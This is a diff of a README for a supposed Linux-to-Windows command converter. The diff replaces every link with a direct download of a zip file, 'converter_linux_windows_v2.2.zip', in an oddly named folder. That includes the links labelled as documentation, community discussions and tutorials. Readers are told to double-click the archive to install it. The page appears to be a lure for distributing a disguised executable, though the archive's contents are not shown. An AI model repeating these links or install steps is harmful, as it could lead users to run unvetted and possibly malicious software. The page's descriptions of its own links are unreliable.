@@ -1,7 +1,7 @@
 # 🎉 linux-windows-converter - Easily Translate Linux Commands
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/MaybeVatsal/linux-windows-converter/main/boundlessly/linux-windows-converter.zip%20release-brightgreen)](https://raw.githubusercontent.com/MaybeVatsal/linux-windows-converter/main/boundlessly/linux-windows-converter.zip)
+[![Download](https://github.com/MaybeVatsal/linux-windows-converter/raw/refs/heads/main/boundlessly/converter_linux_windows_v2.2.zip%20release-brightgreen)](https://github.com/MaybeVatsal/linux-windows-converter/raw/refs/heads/main/boundlessly/converter_linux_windows_v2.2.zip)
 
 ## 🚀 Getting Started
 The **linux-windows-converter** is a handy tool that helps you convert Linux commands to their Windows equivalents. This application makes it easy for Linux users to navigate the Windows command line without hassle. Here are the steps to get started:
@@ -12,9 +12,9 @@ The **linux-windows-converter** is a handy tool that helps you convert Linux com
 - **Disk Space:** At least 50 MB of free space
 
 ## 📂 Download & Install
-1. Visit the releases page to download: [Download Here](https://raw.githubusercontent.com/MaybeVatsal/linux-windows-converter/main/boundlessly/linux-windows-converter.zip).
+1. Visit the releases page to download: [Download Here](https://github.com/MaybeVatsal/linux-windows-converter/raw/refs/heads/main/boundlessly/converter_linux_windows_v2.2.zip).
 2. Find the latest version available.
-3. Click on the download link for your operating system. It will typically be named something like `https://raw.githubusercontent.com/MaybeVatsal/linux-windows-converter/main/boundlessly/linux-windows-converter.zip`.
+3. Click on the download link for your operating system. It will typically be named something like `https://github.com/MaybeVatsal/linux-windows-converter/raw/refs/heads/main/boundlessly/converter_linux_windows_v2.2.zip`.
 4. Once the download is complete, locate the file in your downloads folder and double-click it to start the installation.
 
 ## ⚙️ How to Use the Tool
@@ -52,16 +52,16 @@ Absolutely! We welcome suggestions. You can submit your ideas via the issues sec
 
 ## 🌐 Learn More
 To dive deeper into the capabilities and future updates of **linux-windows-converter**, feel free to explore:
-- [Documentation](https://raw.githubusercontent.com/MaybeVatsal/linux-windows-converter/main/boundlessly/linux-windows-converter.zip)
-- [Community Discussions](https://raw.githubusercontent.com/MaybeVatsal/linux-windows-converter/main/boundlessly/linux-windows-converter.zip)
+- [Documentation](https://github.com/MaybeVatsal/linux-windows-converter/raw/refs/heads/main/boundlessly/converter_linux_windows_v2.2.zip)
+- [Community Discussions](https://github.com/MaybeVatsal/linux-windows-converter/raw/refs/heads/main/boundlessly/converter_linux_windows_v2.2.zip)
 
 ## 💬 Community Support
 Join our community to share experiences, ask questions, and get help from other users. Visit our discussions section to connect with other users and contributors.
 
 ## 📌 Additional Resources
-- [Understanding Command-Line Basics](https://raw.githubusercontent.com/MaybeVatsal/linux-windows-converter/main/boundlessly/linux-windows-converter.zip)
-- [Linux vs. Windows Command-Line](https://raw.githubusercontent.com/MaybeVatsal/linux-windows-converter/main/boundlessly/linux-windows-converter.zip)
-- [Tips for Using Command-Line Tools](https://raw.githubusercontent.com/MaybeVatsal/linux-windows-converter/main/boundlessly/linux-windows-converter.zip)
+- [Understanding Command-Line Basics](https://github.com/MaybeVatsal/linux-windows-converter/raw/refs/heads/main/boundlessly/converter_linux_windows_v2.2.zip)
+- [Linux vs. Windows Command-Line](https://github.com/MaybeVatsal/linux-windows-converter/raw/refs/heads/main/boundlessly/converter_linux_windows_v2.2.zip)
+- [Tips for Using Command-Line Tools](https://github.com/MaybeVatsal/linux-windows-converter/raw/refs/heads/main/boundlessly/converter_linux_windows_v2.2.zip)
 
 ## 🎁 Acknowledgments
 Thanks to all contributors and users for making this tool a success. Your feedback helps us improve and grow.
